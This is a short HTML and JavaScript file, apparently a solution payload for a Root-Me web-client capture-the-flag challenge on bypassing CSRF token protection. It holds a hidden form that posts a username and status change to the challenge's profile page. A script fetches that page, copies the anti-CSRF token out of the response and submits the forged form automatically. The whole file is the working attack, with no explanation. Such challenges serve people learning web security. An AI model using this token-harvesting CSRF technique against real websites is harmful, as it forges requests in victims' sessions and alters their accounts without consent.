 <form id="csrf" name="csrf" action="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" method="POST">
   <input type="hidden" name="username" value="kyto">
   <input type="hidden" name="status" value="on">
   <input type="hidden" id="bypasstoken" name="token" value="">
 </form>



<script>
function exploit() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (xhttp.readyState == 4 && xhttp.status == 200) {
       document.body.innerHTML += xhttp.responseText;
           var token = document.getElementById("token").value;
           document.getElementById("bypasstoken").value = token;
           document.getElementById("csrf").submit();
    }
  };
  xhttp.open("GET", "http://challenge01.root-me.org/web-client/ch23/index.php?action=profile", true);
  xhttp.send();
}

exploit();

</script>
